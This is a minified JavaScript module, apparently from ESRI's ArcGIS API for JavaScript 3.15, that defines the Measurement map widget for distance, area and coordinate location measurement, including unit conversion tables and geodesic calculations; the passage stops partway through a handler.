// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"esri/dijit/Measurement":function(){define("require dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/connect dojo/_base/Color dojo/debounce dojo/sniff dojo/dom-style dojo/dom-construct dojox/gfx dijit/_Widget dijit/registry dijit/Menu dijit/MenuItem ../symbols/PictureMarkerSymbol ../symbols/SimpleLineSymbol ../symbols/SimpleFillSymbol ../symbols/jsonUtils ../geometry/geodesicUtils ../geometry/webMercatorUtils ../geometry/Point ../geometry/Polyline ../geometry/Polygon ../graphic ../tasks/AreasAndLengthsParameters ../tasks/LengthsParameters ../tasks/GeometryService ../kernel ../config ../domUtils ../numberUtils ../lang ../units ../WKIDUnitConversion ../SpatialReference dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin ./_EventedWidget dojo/text!./templates/Measurement.html dojo/i18n!../nls/jsapi dijit/form/ToggleButton dijit/form/DropDownButton dijit/layout/ContentPane".split(" "),
function(l,m,e,h,d,r,D,k,n,A,B,t,g,E,F,J,G,K,L,y,v,H,q,C,p,M,N,O,P,Q,w,x,R,z,S,I,T,U,V,W,u){m=m([V,t,T,U],{declaredClass:"esri.dijit.Measurement",widgetsInTemplate:!0,templateString:W,_map:null,_geometryService:null,_interpolatedMap:null,_mouseImgURL:null,_defaultPinURL:null,_measureGraphics:[],_measureGraphic:null,_locationGraphic:null,_tempGraphic:null,_polylineGraphics:null,_polygonGraphic:null,_pointSymbol:null,_useDefaultPointSymbol:!0,_defaultLineSymbol:null,_lineSymbol:null,_areaLineSymbol:null,
_defaultFillSymbol:null,_fillSymbol:null,_borderlessFillSymbol:null,_defaultCustomPointSymbolHeight:25,_defaultCustomPointSymbolWidth:25,_userGeometry:null,_currentGeometry:null,_inputPoints:[],_unitDictionary:[],_densificationRatio:.07848050723825097,numberPattern:"#,###,###,##0.0",result:null,_defaultDistanceUnit:null,_defaultAreaUnit:null,_defaultLocationUnit:null,currentDistanceUnit:null,currentAreaUnit:null,currentLocationUnit:null,_unitStrings:{},_locationUnitStrings:[],_locationUnitStringsLong:[],
_distanceUnitStrings:[],_distanceUnitStringsLong:[],_areaUnitStrings:[],_areaUnitStringsLong:[],_calculatingMsg:null,_gsErrorMsg:null,_NLS_Lat:null,_NLS_Lon:null,_mouseMoveMapHandler:null,_mouseClickMapHandler:null,_doubleClickMapHandler:null,_mouseDragMapHandler:null,_clickMapHandler:null,_mapExtentChangeHandler:null,_geometryAreaHandler:null,_snappingCallback:null,_calcTimer:null,_buttonDijits:{},previousTool:null,activeTool:null,markerLongitude:null,markerLatitude:null,mouseLongitude:null,mouseLatitude:null,
_eventMap:{"measure-start":["toolName","unitName"],measure:["toolName","geometry","values","unitName","segmentLength"],"measure-end":["toolName","geometry","values","unitName"],"tool-change":["toolName","unitName","previousToolName"],"unit-change":["unitName","toolName"]},constructor:function(a,b){if(a&&a.map){this._map=a.map;if(this._map.loaded)this._map.cs=this._checkCS(this._map.spatialReference),this._interpolatedMap=!("Web Mercator"===this._map.cs||"PCS"===this._map.cs);else var c=d.connect(this._map,
"onLoad",this,function(){d.disconnect(c);c=null;this._map.cs=this._checkCS(this._map.spatialReference);this._interpolatedMap=!("Web Mercator"===this._map.cs||"PCS"===this._map.cs)});this._geometryService=Q.defaults.geometryService;this._mouseImgURL=l.toUrl("./images/cursor16x24.png");this._defaultPinURL=l.toUrl("./images/esriGreenPin16x26.png");this._defaultLineSymbol=new G(G.STYLE_SOLID,new r([0,128,255]),3);this._defaultFillSymbol=new K(G.STYLE_SOLID,this._defaultLineSymbol,new r([0,0,0,.5]));a.pointSymbol?
(this._pointSymbol=a.pointSymbol,this._useDefaultPointSymbol=!1):(this._pointSymbol=new J(this._defaultPinURL,16,26),this._pointSymbol.setOffset(0,12));this._fillSymbol=b=a.fillSymbol||this._defaultFillSymbol;this._areaLineSymbol=b.outline||this._defaultLineSymbol;this._borderlessFillSymbol=L.fromJson(b.toJson());this._borderlessFillSymbol.setOutline(null);this._lineSymbol=a.lineSymbol?a.lineSymbol:this._defaultLineSymbol;this._defaultDistanceUnit=a.defaultLengthUnit?a.defaultLengthUnit:z.MILES;this._defaultAreaUnit=
a.defaultAreaUnit?a.defaultAreaUnit:z.ACRES;this._defaultLocationUnit=a.defaultLocationUnit?a.defaultLocationUnit:z.DECIMAL_DEGREES;this._snappingCallback=e.hitch(this,this._snappingCallback);a.geometry&&(this._userGeometry=a.geometry);this._calcTimer=null;this.advancedLocationUnits=a.advancedLocationUnits||!1;this._NLS_Lon=u.widgets.measurement.NLS_longitude;this._NLS_Lat=u.widgets.measurement.NLS_latitude;this._gsErrorMsg=u.widgets.measurement.NLS_geometry_service_error;this._calculatingMsg=u.widgets.measurement.NLS_calculating;
this._geometryServiceLength=D(this._geometryServiceLength,250)}else console.log("Unable to find the required 'map' property in widget parameters")},startup:function(){this._setupDictionaries();A.create("img",{src:this._mouseImgURL,style:"vertical-align: middle"},this.mouseCell);this._useDefaultPointSymbol?A.create("img",{src:this._defaultPinURL,style:"vertical-align: middle"},this.pinCell):this._drawPointGraphics(this.pinCell);if(this._userGeometry)if(this._map.loaded)this._measureCustomGeometry(this._userGeometry),
this._userGeometry=null;else var a=d.connect(this._map,"onLoad",this,function(){d.disconnect(a);a=null;this._measureCustomGeometry(this._userGeometry);this._userGeometry=null})},destroy:function(){this._resetToolState();this.clearResult();this.inherited(arguments);this._map=this._geometryService=this._measureGraphics=this._measureGraphic=this._tempGraphic=null},setTool:function(a,b){this.previousTool=this.activeTool||null;this._polylineGraphics=[];this._resetToolState();this._polygonGraphic&&(this._map.graphics.remove(this._polygonGraphic),
this._polygonGraphic=null);var c=g.byNode(this._buttonDijits[a].domNode).checked;n.set(this._unitDropDown.domNode,"visibility","visible");g.byNode(this._buttonDijits.area.domNode).set("checked",!1);g.byNode(this._buttonDijits.distance.domNode).set("checked",!1);g.byNode(this._buttonDijits.location.domNode).set("checked",!1);if(!0===b||!1===b)c=b;g.byNode(this._buttonDijits[a].domNode).set("checked",c);this._toggleLocationResultsTable(!1,!0);c?(this.activeTool=a,(this._dblClickZoom=this._map.isDoubleClickZoom)&&
this._map.disableDoubleClickZoom(),"area"===a?this._setupAreaTool():"distance"===a?this._setupDistanceTool():"location"===a&&this._setupLocationTool(),this._map.snappingManager&&(this._map.snappingManager._startSelectionLayerQuery(),this._map.snappingManager._setUpSnapping())):(this.activeTool=null,n.set(this._unitDropDown.domNode,"visibility","hidden"));if(this.activeTool!==this.previousTool)this.onToolChange(this.activeTool,this.getUnit(),this.previousTool)},measure:function(a){a&&this._measureCustomGeometry(a)},
clearResult:function(){var a=this._map,b;this.result=0;this.resultValue.setContent("\x26nbsp");for(b=0;b<this._measureGraphics.length;b++)a.graphics.remove(this._measureGraphics[b]);this._measureGraphic=this._locationGraphic=this._currentGeometry=null;this._measureGraphics=[];a.graphics.remove(this._tempGraphic);d.disconnect(this._mouseMoveMapHandler);this._mouseMoveMapHandler=null},show:function(){w.show(this.domNode)},hide:function(){w.hide(this.domNode)},showTool:function(a){n.set(this._buttonDijits[a].domNode,
"display","inline-block")},hideTool:function(a){n.set(this._buttonDijits[a].domNode,"display","none")},getTool:function(){if(this.activeTool)return{toolName:this.activeTool,unitName:this.getUnit()}},getUnit:function(){if("unit"!==this._unitDropDown.label)return this._unitDropDown.label},_setupLocationTool:function(){this._map.navigationManager.setImmediateClick(!0);this._measureGraphics=[];this._map.graphics.remove(this._locationGraphic);this._createLocationUnitList();"PCS"===this._map.cs&&(this._projectMapExtent(this._map.extent),
this._mapExtentChangeHandler=d.connect(this._map,"onExtentChange",e.hitch(this,this._projectMapExtent)));this._clickMapHandler=d.connect(this._map,"onClick",this,"_locationClickHandler");if("esriDegreeMinuteSeconds"===this.currentLocationUnit||"esriDecimalDegrees"===this.currentLocationUnit)this._mouseMoveMapHandler=d.connect(this._map,"onMouseMove",this,"_locationMoveHandler")},_locationButtonToggle:function(){this.clearResult();this.setTool("location")},_measureCustomPoint:function(a){this.setTool("location",
!0);"Web Mercator"===this._map.cs&&a.spatialReference!==this._map.spatialReference&&(a=v.geographicToWebMercator(a));this._measureGraphic=new p;this._measureGraphic.setSymbol(this._pointSymbol);this._measureGraphic.setGeometry(a);this._measureGraphics.push(this._measureGraphic);this._map.graphics.add(this._measureGraphic);this._currentGeometry=a;this._calculateLocation(a,!0)},_calculateLocation:function(a,b){var c=!("esriDegreeMinuteSeconds"===this.currentLocationUnit||"esriDecimalDegrees"===this.currentLocationUnit);
c&&this._mouseMoveMapHandler&&(d.disconnect(this._mouseMoveMapHandler),this._mouseMoveMapHandler=null);a=e.clone(a);if(b){if("Web Mercator"!==this.map.cs&&this.map.spatialReference&&4326!==this.map.spatialReference.wkid){this._projectLocation(a,c);return}this._updateMarkerLocation(a.x,a.y)}a=this._getGCSLocation(a);this._advancedLocationDisplayHandler(a,c,b)},_projectLocation:function(a,b){this._geometryService.project([a],new I({wkid:4326}),e.hitch(this,function(a){this._advancedLocationDisplayHandler(a[0],
b,!0)}),e.hitch(this,function(a){console.log(this._gsErrorMsg,a)}))},_advancedLocationDisplayHandler:function(a,b,c){b?this._updateGeocoordinateStringLocation({coordinates:[[a.x,a.y]],sr:{wkid:4326},conversionType:this._unitStrings[this.currentLocationUnit]},a):(b=this._calculateXY(a.x,a.y),c?(this._updateClickLocation(b[0],b[1]),this.onMeasureEnd(this.activeTool,a,[b[0],b[1]],this.getUnit())):this._updateMouseLocation(b[0],b[1]))},_updateMarkerLocation:function(a,b){this.markerLocationX=a;this.markerLocationY=
b},_updateMouseLocation:function(a,b){this.mouseLongitude.innerHTML=a;this.mouseLatitude.innerHTML=b},_updateClickLocation:function(a,b){this._updateMouseLocation(a,b);this.markerLongitude.innerHTML=a;this.markerLatitude.innerHTML=b},_updateGeocoordinateStringLocation:function(a,b){this.resultValue.setContent("\x26nbsp");this._geometryService.toGeoCoordinateString(a,e.hitch(this,function(a){clearTimeout(this._calcTimer);a?(this.resultValue.setContent(a[0]),this.onMeasureEnd(this.activeTool,b,a,this.getUnit())):
(this.resultValue.setContent(this._gsErrorMsg),this.onMeasureEnd(this.activeTool,null,null,this.getUnit()))}));clearTimeout(this._calcTimer);this._calcTimer=setTimeout(e.hitch(this,function(){this.resultValue.setContent(this._calculatingMsg)},1E3))},_switchLocationUnit:function(a){g.byNode(this._unitDropDown.domNode).set("label",this._unitStrings[a]);this.currentLocationUnit=a;d.disconnect(this._mouseMoveMapHandler);this._mouseMoveMapHandler=null;this.onUnitChange(this._unitStrings[a],this.activeTool);
if("esriDegreeMinuteSeconds"===a||"esriDecimalDegrees"===a)this._mouseMoveMapHandler=d.connect(this._map,"onMouseMove",this,"_locationMoveHandler"),this._toggleLocationResultsTable(!0,!1),this._locationGraphic&&this._calculateLocation(this._locationGraphic.geometry,!0);else if(this._toggleLocationResultsTable(!1,!1),null!==this.resultValue&&(null!==this.markerLocationX||null!==this.markerLocationY)&&this._locationGraphic){var b=this._getGCSLocation(this._locationGraphic.geometry);this._updateGeocoordinateStringLocation({coordinates:[[b.x,
b.y]],sr:{wkid:4326},conversionType:this._unitStrings[a]},this._locationGraphic.geometry)}},_toggleLocationResultsTable:function(a,b){b&&(this.resultValue.setContent("\x26nbsp"),this.markerLongitude.innerHTML="---",this.markerLatitude.innerHTML="---",this.mouseLongitude.innerHTML="---",this.mouseLatitude.innerHTML="---");a?(w.show(this.resultTable.domNode),w.hide(this.resultValueContainer.domNode)):(w.hide(this.resultTable.domNode),w.show(this.resultValueContainer.domNode),d.disconnect(this._mouseMoveMapHandler));
"PCS"===this._map.cs&&w.hide(this._mouseRow)},_setupDistanceTool:function(){this._map.navigationManager.setImmediateClick(!0);"PCS"===this._map.cs&&(this._projectMapExtent(this._map.extent),this._mapExtentChangeHandler=d.connect(this._map,"onExtentChange",this,"_projectMapExtent"));this._inputPoints=[];this._createDistanceUnitList();this._mouseClickMapHandler=d.connect(this._map,"onClick",this,"_measureDistanceMouseClickHandler");this._doubleClickMapHandler=d.connect(this._map,"onDblClick",this,"_measureDistanceDblClickHandler")},
_distanceButtonToggle:function(){this.clearResult();this.setTool("distance")},_measureCustomDistance:function(a){if(1<a.paths[0].length){this.setTool("distance",!0);this._inputPoints=[];h.forEach(a.paths[0],e.hitch(this,function(b,f){this._inputPoints.push(b);var c=new p(new H(b[0],b[1],a.spatialReference),this._pointSymbol);this._measureGraphics.push(c);this._map.graphics.add(c);0!==f&&(this.result+=this._geodesicDistance(b,a.paths[0][f-1]))}));this._measureGraphic=new p;this._measureGraphic.setSymbol(this._lineSymbol);
this._measureGraphics.push(this._measureGraphic);var b=this._densifyGeometry(a);this._measureGraphic.setGeometry(b);this._map.graphics.add(this._measureGraphic);this._inputPoints=[];b=this._outputResult(this.result,this.getUnit());this._currentGeometry=a;this.onMeasureEnd(this.activeTool,a,b,this.getUnit())}},_showDistance:function(a){a&&this._outputResult(a,g.byNode(this._unitDropDown.domNode).label)},_setupAreaTool:function(){this._map.navigationManager.setImmediateClick(!0);this._inputPoints=[];
this._createAreaUnitList();this._tempGraphic=new p;this._tempGraphic.setSymbol(this._areaLineSymbol);this._tempGraphic.setGeometry(new q(this._map.spatialReference));this._map.graphics.add(this._tempGraphic);"PCS"===this._map.cs&&(this._geometryAreaHandler=d.connect(this._geometryService,"onAreasAndLengthsComplete",this,"_outputArea"));this._mouseClickMapHandler=d.connect(this._map,"onClick",this,"_measureAreaMouseClickHandler");this._doubleClickMapHandler=d.connect(this._map,"onDblClick",this,"_measureAreaDblClickHandler")},
_areaButtonToggle:function(){this.clearResult();this.setTool("area")},_generatePolygonFromPaths:function(){var a=[];h.forEach(this._polylineGraphics,e.hitch(this,function(b){h.forEach(b.geometry.paths,e.hitch(this,function(b){h.forEach(b,e.hitch(this,function(b){a.push(b)}))}))}));a.push(a[0]);var b=new C(this._map.spatialReference);b.addRing(a);var b=this._densifyGeometry(b),c=new p;c.setGeometry(b);c.setSymbol(this._borderlessFillSymbol);this._measureGraphic=c;this._measureGraphics.push(c);return c},
_getArea:function(a){var b=[],c=new M;c.areaUnit=O.UNIT_SQUARE_METERS;c.calculationType="geodesic";C.prototype.isSelfIntersecting(a)?this._geometryService.simplify([a],e.hitch(this,function(a){h.forEach(a,e.hitch(this,function(f){"PCS"===this._map.cs?(c.polygons=a,this._geometryService.areasAndLengths(c)):("Web Mercator"===this._map.cs&&(f=v.webMercatorToGeographic(f)),b.push(f))}));var f=y.geodesicAreas(b,z.SQUARE_METERS);this._showArea(f[0])})):("Web Mercator"===this._map.cs&&(a=v.webMercatorToGeographic(a)),
b.push(a),"PCS"===this._map.cs?(c.polygons=b,this._geometryService.areasAndLengths(c)):(a=y.geodesicAreas(b,z.SQUARE_METERS),this._showArea(Math.abs(a[0]))))},_outputArea:function(a){this._showArea(Math.abs(a.areas[0]))},_showArea:function(a){if(a)if(this.result=a,a=g.byNode(this._unitDropDown.domNode).label,a=this._outputResult(this.result,a),this._mouseMoveMapHandler)this.onMeasure(this.activeTool,this._currentGeometry,a,this.getUnit(),null);else this.onMeasureEnd(this.activeTool,this._currentGeometry,
a,this.getUnit())},_measureCustomArea:function(a){this.setTool("area",!0);this._inputPoints=[];var b=this._densifyGeometry(a);this._currentGeometry=a;this._measureGraphic=new p;this._measureGraphic.setGeometry(b);this._measureGraphic.setSymbol(this._fillSymbol);this._measureGraphics.push(this._measureGraphic);this._map.graphics.add(this._measureGraphic);this._getArea(a);this._inputPoints=[]},_resetToolState:function(){var a=this._map;a.navigationManager.setImmediateClick(!1);this._dblClickZoom&&a.enableDoubleClickZoom();
this._inputPoints=[];d.disconnect(this._mouseClickMapHandler);d.disconnect(this._mouseMoveMapHandler);d.disconnect(this._doubleClickMapHandler);d.disconnect(this._mouseDragMapHandler);d.disconnect(this._clickMapHandler);d.disconnect(this._mapExtentChangeHandler);d.disconnect(this._geometryAreaHandler);this._mouseClickMapHandler=this._mouseMoveMapHandler=this._doubleClickMapHandler=this._mouseDragMapHandler=this._clickMapHandler=this._mapExtentChangeHandler=this._geometryAreaHandler=null;a.snappingManager&&
a.snappingManager._snappingGraphic&&a.graphics.remove(a.snappingManager._snappingGraphic);this._map.snappingManager&&(this._map.snappingManager._stopSelectionLayerQuery(),this._map.snappingManager._killOffSnapping());this._unitDropDown._opened&&this._unitDropDown.closeDropDown()},_measureCustomGeometry:function(a){this.clearResult();switch(a.type){case "point":this._measureCustomPoint(a);break;case "polyline":this._measureCustomDistance(a);break;case "polygon":this._measureCustomArea(a)}},_densifyGeometry:function(a){var b=
this._map.cs,c=y.getSpheroidInfo(a.spatialReference).radius*this._densificationRatio;"Web Mercator"===b?(a=v.webMercatorToGeographic(a),c=y.geodesicDensify(a,c),c=v.geographicToWebMercator(c)):c="PCS"===b?a:y.geodesicDensify(a,c);return c},_geodesicDistance:function(a,b){var c=new q(this._map.spatialReference);"PCS"===this._map.cs&&(a=this._getGCSLocation(a),b=this._getGCSLocation(b));c.addPath([a,b]);"Web Mercator"===this._map.cs&&(c=v.webMercatorToGeographic(c));return y.geodesicLengths([c],z.METERS)[0]},
_calculateXY:function(a,b){var c=u.widgets.measurement,f=this._map.getScale(),d,e;if(this.getUnit()===c.NLS_decimal_degrees)e=500<=f?6:500>f&&50<=f?7:50>f&&5<=f?8:9,d=a.toFixed(e),this._map.spatialReference._isWrappable()||(d=this._roundX(d)),d=x.format(d),e=x.format(this._roundY(b.toFixed(e)));else if(this.getUnit()===c.NLS_deg_min_sec){var g=c=!1,k,t;e=9E4<=f?0:9E4>f&&9E3<=f?1:9E3>f&&900<=f?2:900>f&&90<f?3:4;0>a&&(c=!0,a=Math.abs(a));0>b&&(g=!0,b=Math.abs(b));b=this._roundY(b);this._map.spatialReference._isWrappable()||
(a=this._roundX(a));k=Math.floor(b)+"\u00b0";d=Math.floor(a)+"\u00b0";t=Math.floor(this._getDegreeMinutes(b))+"'";f=Math.floor(this._getDegreeMinutes(a))+"'";b=x.format(this._getDegreeSeconds(b).toFixed(e))+'"';a=x.format(this._getDegreeSeconds(a).toFixed(e))+'"';e=k+t+b;d=d+f+a;c&&(d="-"+d);g&&(e="-"+e)}return[d,e]},_getDegreeMinutes:function(a){return 60*(a-Math.floor(a))},_getDegreeSeconds:function(a){return 60*(60*(a-Math.floor(a))-Math.floor(60*(a-Math.floor(a))))},_roundY:function(a){90<a?a=
90:-90>a&&(a=-90);return a},_roundX:function(a){180<a?a=180:-180>a&&(a=-180);return a},_getGCSLocation:function(a){a=e.clone(a);var b=this._map,c=b.extent,f=b._newExtent;"Web Mercator"===b.cs?a=v.webMercatorToGeographic(a):"PCS"===b.cs?f&&(a=new H((a.x-c.xmin)*Math.abs((f.xmax-f.xmin)/(c.xmax-c.xmin))+f.xmin,(a.y-c.ymin)*Math.abs((f.ymax-f.ymin)/(c.ymax-c.ymin))+f.ymin,b.spatialReference)):a=a.normalize();return a},_projectMapExtent:function(a){a=new p(a);var b=new I({wkid:4326});this._geometryService.project([a.geometry],
b,e.hitch(this,function(a){if(!this._mouseMoveMapHandler&&"location"===this.activeTool){if("esriDegreeMinuteSeconds"===this.currentLocationUnit||"esriDecimalDegrees"===this.currentLocationUnit)this._mouseMoveMapHandler=d.connect(this._map,"onMouseMove",e.hitch(this,this._locationMoveHandler));this._mouseMoveMapHandler=d.connect(this._map,"onMouseMove",e.hitch(this,this._locationMoveHandler))}this._map._newExtent=a[0]}))},_checkCS:function(a){if(a.wkid)return 3857===a.wkid||102100===a.wkid||102113===
a.wkid?"Web Mercator":R.isDefined(S[a.wkid])?"PCS":"GCS";if(a.wkt)return-1!==a.wkt.indexOf("WGS_1984_Web_Mercator")?"Web Mercator":0===a.wkt.indexOf("PROJCS")?"PCS":"GCS"},_switchUnit:function(a){"distance"===this.activeTool?this.currentDistanceUnit=a:"area"===this.activeTool?this.currentAreaUnit=a:"location"===this.activeTool&&(this.currentLocationUnit=a);g.byNode(this._unitDropDown.domNode).set("label",this._unitStrings[a]);if(null!==this.result){var b=this._outputResult(this.result,this._unitStrings[a]);
this.onUnitChange(this._unitStrings[a],this.activeTool);if(null!==this._currentGeometry||null!==this._measureGraphic)if(a=this._currentGeometry||this._measureGraphic.geometry,this._mouseMoveMapHandler)this.onMeasure(this.activeTool,a,b,this.getUnit(),null);else this.onMeasureEnd(this.activeTool,a,b,this.getUnit())}},_setupDictionaries:function(){var a=u.widgets.measurement;this._unitDictionary[a.NLS_length_meters]=1;this._unitDictionary[a.NLS_length_kilometers]=1E3;this._unitDictionary[a.NLS_length_feet]=
.3048;this._unitDictionary[a.NLS_length_miles]=1609.344;this._unitDictionary[a.NLS_length_yards]=.9144;this._unitDictionary[a.NLS_length_nautical_miles]=1852;this._unitDictionary[a.NLS_length_miles_us]=1609.347218694438;this._unitDictionary[a.NLS_length_feet_us]=.3048006096012192;this._unitDictionary[a.NLS_length_yards_us]=.9144018288036576;this._unitDictionary[a.NLS_area_sq_meters]=1;this._unitDictionary[a.NLS_area_sq_kilometers]=1E6;this._unitDictionary[a.NLS_area_sq_feet]=.09290304;this._unitDictionary[a.NLS_area_acres]=
4046.8564224;this._unitDictionary[a.NLS_area_sq_miles]=2589988.110336;this._unitDictionary[a.NLS_area_hectares]=1E4;this._unitDictionary[a.NLS_area_sq_yards]=.83612736;this._unitDictionary[a.NLS_area_sq_nautical_miles]=3429904;this._unitDictionary[a.NLS_area_acres_us]=4046.872609874252;this._unitDictionary[a.NLS_area_sq_miles_us]=2589998.470319522;this._unitDictionary[a.NLS_area_sq_feet_us]=.09290341161327487;this._unitDictionary[a.NLS_area_sq_yards_us]=.8361307045194736;this._unitStrings={esriMiles:a.NLS_length_miles,
esriKilometers:a.NLS_length_kilometers,esriFeet:a.NLS_length_feet,esriFeetUS:a.NLS_length_feet_us,esriMeters:a.NLS_length_meters,esriYards:a.NLS_length_yards,esriNauticalMiles:a.NLS_length_nautical_miles,esriMilesUS:a.NLS_length_miles_us,esriYardsUS:a.NLS_length_yards_us,esriAcres:a.NLS_area_acres,esriSquareMiles:a.NLS_area_sq_miles,esriSquareKilometers:a.NLS_area_sq_kilometers,esriHectares:a.NLS_area_hectares,esriSquareYards:a.NLS_area_sq_yards,esriSquareFeet:a.NLS_area_sq_feet,esriSquareFeetUS:a.NLS_area_sq_feet_us,
esriSquareMeters:a.NLS_area_sq_meters,esriAcresUS:a.NLS_area_acres_us,esriSquareMilesUS:a.NLS_area_sq_miles_us,esriSquareYardsUS:a.NLS_area_sq_yards_us,esriSquareNauticalMiles:a.NLS_area_sq_nautical_miles,esriDecimalDegrees:a.NLS_decimal_degrees,esriDegreeMinuteSeconds:a.NLS_deg_min_sec,esriMGRS:a.NLS_MGRS,esriUSNG:a.NLS_USNG,esriUTM:a.NLS_UTM,esriGARS:a.NLS_GARS,esriGeoRef:a.NLS_GeoRef,esriDDM:a.NLS_DDM,esriDD:a.NLS_DD};this._locationUnitStrings=[a.NLS_decimal_degrees,a.NLS_deg_min_sec,a.NLS_MGRS,
a.NLS_USNG,a.NLS_UTM,a.NLS_GeoRef,a.NLS_GARS];this._locationUnitStringsLong="esriDecimalDegrees esriDegreeMinuteSeconds esriMGRS esriUSNG esriUTM esriGeoRef esriGARS".split(" ");this._distanceUnitStrings=[a.NLS_length_miles,a.NLS_length_kilometers,a.NLS_length_feet,a.NLS_length_feet_us,a.NLS_length_meters,a.NLS_length_yards,a.NLS_length_nautical_miles];this._distanceUnitStringsLong="esriMiles esriKilometers esriFeet esriFeetUS esriMeters esriYards esriNauticalMiles".split(" ");this._areaUnitStrings=
[a.NLS_area_acres,a.NLS_area_sq_miles,a.NLS_area_sq_kilometers,a.NLS_area_hectares,a.NLS_area_sq_yards,a.NLS_area_sq_feet,a.NLS_area_sq_feet_us,a.NLS_area_sq_meters];this._areaUnitStringsLong="esriAcres esriSquareMiles esriSquareKilometers esriHectares esriSquareYards esriSquareFeet esriSquareFeetUS esriSquareMeters".split(" ");this._buttonDijits={area:this._areaButton,distance:this._distanceButton,location:this._locationButton};g.byNode(this._distanceButton.domNode).setLabel(a.NLS_distance);g.byNode(this._areaButton.domNode).setLabel(a.NLS_area);
g.byNode(this._locationButton.domNode).setLabel(a.NLS_location);g.byNode(this.resultLabel.domNode).setContent(a.NLS_resultLabel)},onToolChange:function(){},onUnitChange:function(){},onMeasureStart:function(){},onMeasure:function(){},onMeasureEnd:function(){},_measureAreaMouseClickHandler:function(a){var b;this._map.snappingManager&&(b=this._map.snappingManager._snappingPoint);b=b||a.mapPoint;this._inputPoints.push(b);this._currentStartPt=b;if(1===this._inputPoints.length){this._tempGraphic.setGeometry(new q(this._map.spatialReference));
for(a=0;a<this._measureGraphics.length;a++)this._map.graphics.remove(this._measureGraphics[a]);this._measureGraphics=[];this.result=0;this._outputResult(this.result,u.widgets.measurement.NLS_area_sq_meters);this._mouseMoveMapHandler=d.connect(this._map,"onMouseMove",this,"_measureAreaMouseMoveHandler");this.onMeasureStart(this.activeTool,this.getUnit())}this._measureGraphic=new p;this._measureGraphic.setSymbol(this._areaLineSymbol);this._measureGraphics.push(this._measureGraphic);if(1<this._inputPoints.length){a=
new q(this._map.spatialReference);a.addPath([this._inputPoints[this._inputPoints.length-2],b]);var c=new q(this._map.spatialReference);c.addPath([this._inputPoints[0],b]);b=this._densifyGeometry(a);c=this._densifyGeometry(c);this._tempGraphic.setGeometry(c);this._measureGraphic.setGeometry(b);this._map.graphics.add(this._measureGraphic);b=new p;b.setGeometry(a);this._polylineGraphics.push(b);if(2<this._inputPoints.length){b=new C(this._map.spatialReference);c=[];for(a=0;a<this._inputPoints.length;a++)c.push([this._inputPoints[a].x,
this._inputPoints[a].y]);c.push([this._inputPoints[0].x,this._inputPoints[0].y]);b.addRing(c);this._currentGeometry=b;this._polygonGraphic?(this._map.graphics.remove(this._polygonGraphic),this._polylineGraphics.push(this._tempGraphic),this._polygonGraphic=this._generatePolygonFromPaths(),this._map.graphics.add(this._polygonGraphic),this._measureGraphic=this._polygonGraphic,this._polylineGraphics.pop()):(this._polygonGraphic=this._generatePolygonFromPaths(),this._map.graphics.add(this._polygonGraphic));
this._getArea(b)}}else this._polygonGraphic&&(this._map.graphics.remove(this._polygonGraphic),this._polygonGraphic=null)},_measureAreaMouseMoveHandler:function(a){var b;if(0<this._inputPoints.length){var c=new q(this._map.spatialReference),f;this._map.snappingManager&&(f=this._map.snappingManager._snappingPoint);b=f||a.mapPoint;c.addPath([this._currentStartPt,b]);a=this._densifyGeometry(c);this._tempGraphic.setGeometry(a)}1<this._inputPoints.length&&(a=new q(this._map.spatialReference),a.addPath([b,
this._inputPoints[0]]),b=this._densifyGeometry(a),this._tempGraphic.setGeometry(this._tempGraphic.geometry.addPath(b.paths[0])))},_measureAreaDblClickHandler:function(a){d.disconnect(this._mouseMoveMapHandler);this._mouseMoveMapHandler=null;"touch"===this._map.navigationManager.eventModel&&k("ios")&&this._measureAreaMouseClickHandler(a);a=new C(this._map.spatialReference);var b=[],c;for(c=0;c<this._inputPoints.length;c++)b.push([this._inputPoints[c].x,this._inputPoints[c].y]);b.push([this._inputPoints[0].x,
this._inputPoints[0].y]);a.addRing(b);this._inputPoints=[];this._currentGeometry=a;this._polygonGraphic&&(this._map.graphics.remove(this._polygonGraphic),this._polylineGraphics.push(this._tempGraphic),this._polygonGraphic=this._generatePolygonFromPaths(),this._map.graphics.add(this._polygonGraphic));this._getArea(a);this._polylineGraphics=[]},_measureDistanceMouseClickHandler:function(a){var b;this._map.snappingManager&&(b=this._map.snappingManager._snappingPoint);a=b||a.mapPoint;this._inputPoints.push(a);
this._currentStartPt=a;if(1===this._inputPoints.length){for(b=0;b<this._measureGraphics.length;b++)this._map.graphics.remove(this._measureGraphics[b]);this._map.graphics.remove(this._tempGraphic);this._measureGraphics=[];this.result=0;this._outputResult(this.result,u.widgets.measurement.NLS_length_meters);this._tempGraphic=new p;this._tempGraphic.setSymbol(this._lineSymbol);this._map.graphics.add(this._tempGraphic);this._mouseMoveMapHandler=d.connect(this._map,"onMouseMove",this,"_measureDistanceMouseMoveHandler");
this.onMeasureStart(this.activeTool,this.getUnit())}this._tempGraphic.setGeometry(new q(this._map.spatialReference));b=new p;b.setSymbol(this._pointSymbol);b.setGeometry(a);this._measureGraphics.push(b);this._map.graphics.add(b);if(1<this._inputPoints.length){this._measureGraphic=new p;this._measureGraphic.setSymbol(this._lineSymbol);this._measureGraphics.push(this._measureGraphic);b=new q(this._map.spatialReference);b.addPath([this._inputPoints[this._inputPoints.length-2],a]);var c=this._densifyGeometry(b);
this._measureGraphic.setGeometry(c);this._map.graphics.add(this._measureGraphic);"PCS"===this._map.cs?this._geometryServiceLength(b,!1):(c=this._geodesicDistance(this._inputPoints[this._inputPoints.length-2],a),b=this._outputResult(c,this.getUnit()),this.result+=c,this._showDistance(this.result),c=this._outputResult(this.result,this.getUnit()),this.onMeasure(this.activeTool,a,c,this.getUnit(),b))}else b.setSymbol(this._pointSymbol)},_measureDistanceMouseMoveHandler:function(a){if(0<this._inputPoints.length){var b,
c=new q(this._map.spatialReference);this._map.snappingManager&&(b=this._map.snappingManager._snappingPoint);a=b||a.mapPoint;c.addPath([this._currentStartPt,a]);c=this._densifyGeometry(c);this._tempGraphic.setGeometry(c);"PCS"!==this._map.cs&&(b=this._geodesicDistance(this._currentStartPt,a),c=this._outputResult(b,this.getUnit()),b+=this.result,this._showDistance(b),b=this._outputResult(b,this.getUnit()),this.onMeasure(this.activeTool,a,b,this.getUnit(),c))}},_measureDistanceDblClickHandler:function(a){var b;
